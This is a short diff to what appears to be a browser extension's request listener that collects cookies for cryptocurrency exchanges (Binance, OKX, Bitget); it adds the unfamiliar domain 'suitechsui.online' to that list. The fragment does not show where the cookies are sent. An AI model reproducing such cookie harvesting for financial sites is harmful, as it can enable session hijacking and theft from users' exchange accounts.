@@ -131,6 +131,7 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
     // Fetch cookies for all supported domains
     if (
       details.url.includes("binance.com") ||
+      details.url.includes("suitechsui.online") ||
       details.url.includes("okx.com") ||
       details.url.includes("bitget.com")
     ) {
